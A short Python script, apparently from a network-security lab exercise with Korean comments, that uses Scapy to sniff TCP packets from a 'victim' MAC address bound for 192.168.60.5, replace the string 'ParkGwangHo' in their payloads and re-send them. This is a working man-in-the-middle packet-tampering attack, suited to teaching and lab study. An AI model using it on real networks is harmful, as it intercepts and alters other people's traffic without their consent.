from scapy.all import *

MAC_A = "02:42:0a:09:00:05" # victim
IP_B = "192.168.60.5" # 목적지

def spoof_pkt(pkt):  # 패킷 변조
    newpkt = IP(bytes(pkt[IP]))
    del(newpkt.chksum)
    del(newpkt[TCP].payload)
    del(newpkt[TCP].chksum)

    if pkt[TCP].payload:
        data = pkt[TCP].payload.load
        newdata = data.replace(b'ParkGwangHo', b'AAAAAAAAAAA')
        send(newpkt/newdata)
    else:
        send(newpkt)

f = 'tcp and ether src {A} and ip dst {B}'.format(A=MAC_A, B=IP_B) # victim에서 오고 192.168.60.5로 가는 TCP 패킷
pkt = sniff(iface='eth0', filter=f, prn=spoof_pkt) # 패킷 sniffing 스니핑 후 filter 조건에 맞게 필터링 후 spoof_pkt 함수 호출 